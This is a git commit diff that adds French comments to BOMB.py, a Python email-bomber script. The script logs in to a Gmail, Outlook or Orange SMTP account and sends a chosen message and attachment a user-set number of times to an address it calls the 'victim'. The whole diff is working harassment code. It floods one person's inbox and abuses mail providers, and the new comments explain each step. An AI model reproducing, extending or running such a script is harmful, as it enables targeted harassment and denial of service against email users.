f6c4fd7f9766e4ee1eab4a5835a0e1663e292993
S1rN3tZ <40497633+mathis2001@users.noreply.github.com>
2022-03-10 10:55:57 +0100

    Ajout de commentaires

--- BOMB.py
+++ BOMB.py
@@ -6,17 +6,18 @@ from email.mime.text import MIMEText
 from email.utils import formatdate
 import logging
 
-server = input ("Entrez le serveur SMTP que vous souhaitez utiliser ou choisissez l'un de ceux proposés (1:Gmail, 2:Outlook, 3:Orange) \n ")
-SrcEmail = input(str('Entrez votre email: '))
-SrcMdp = getpass.getpass('Entrez votre mot de passe: ')
+server = input ("Entrez le serveur SMTP que vous souhaitez utiliser ou choisissez l'un de ceux proposés (1:Gmail, 2:Outlook, 3:Orange) \n ") #Choix du serveur SMTP
+SrcEmail = input(str('Entrez votre email: '))  #Entrée de l'email de l'utilisateur
+SrcMdp = getpass.getpass('Entrez votre mot de passe: ')  #Entréé du mot de passe de l'email
  
  
-DestEmail = input('\nEmail de la victime: ')
-Sujet = input('Sujet: ') 
-Contenu = input('Message: ')
-Joint = input('Souhaitez vous ajouter une piece jointe ? Si oui, veuillez entrer le chemin pour y accéder')
-Nbr_Mails = int(input('Combien de mails voulez vous envoyer ? '))
+DestEmail = input('\nEmail de la victime: ')  #Entrée de l'email de la victime
+Sujet = input('Sujet: ')  #Entrée de l'objet du mail
+Contenu = input('Message: ')  #Entrée du message à envoyer
+Joint = input('Souhaitez vous ajouter une piece jointe ? Si oui, veuillez entrer le chemin pour y accéder')  #Ajout d'une potentielle pièce jointe
+Nbr_Mails = int(input('Combien de mails voulez vous envoyer ? '))  #Entrée du nombre de mails à envoyer
 
+#Formatage du mail
 msg = MIMEMultipart()
 msg['Date'] = formatdate(localtime=True)
 msg['Subject'] = Sujet
@@ -25,6 +26,7 @@ msg['To'] = DestEmail
 
 msg.attach(MIMEText(open(Joint).read()))
 
+#Configuration suivant le choix du serveur SMTP
 if server == '1':
     smtp_server = 'smtp.gmail.com'
     port = 587
@@ -39,29 +41,30 @@ else:
     sys.exit()
  
 print ('')
- 
+
 try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(SrcEmail,SrcMdp)
+    server = smtplib.SMTP(smtp_server,port)  #initialisation des paramètres
+    server.ehlo()  #Prise de contact avec le serveur
+    if smtp_server == "smtp.gmail.com": #Si il s'agit d'un serveur gmail
+            server.starttls()   #On utilise le protocole TLS
+    server.login(SrcEmail,SrcMdp) #Connection au serveur
     
-    for i in range(0,Nbr_Mails):
-        server.sendmail(SrcEmail,DestEmail,msg.as_string())
-        i +=1
-    print ("\r[+] Nombre d'emails envoyés: %i" % i)
+    for i in range(0,Nbr_Mails):  #pour i allant de 0 au nombre de mails à envoyer
+        server.sendmail(SrcEmail,DestEmail,msg.as_string())  #Envoie du mail
+        i +=1  #incrément de i+1
+    print ("\r[+] Nombre d'emails envoyés: %i" % i)  #Décompte des mails envoyés
     sys.stdout.flush()
-    server.quit()
+    server.quit()  #On quitte le serveur
     print ('\n [+] Envoie terminé')
     
+    #On créé un fichier de log
     logging.basicConfig(filename='log.log', encoding='utf-8', level=logging.DEBUG)
     logging.info(msg)
     
-except KeyboardInterrupt:
-    print ('[-] Annulé')
+except KeyboardInterrupt:  #En cas d'interruption clavier
+    print ('[-] Annulé')  #On affiche un message d'interruption
     sys.exit()
    
-except smtplib.SMTPAuthenticationError:
-    print ('\n[!] Email ou mot de passe incorrect')
+except smtplib.SMTPAuthenticationError:  #Si les informations d'identification au serveur SMTP
+    print ('\n[!] Email ou mot de passe incorrect')  #On affiche un message d'erreur adapté
     sys.exit()
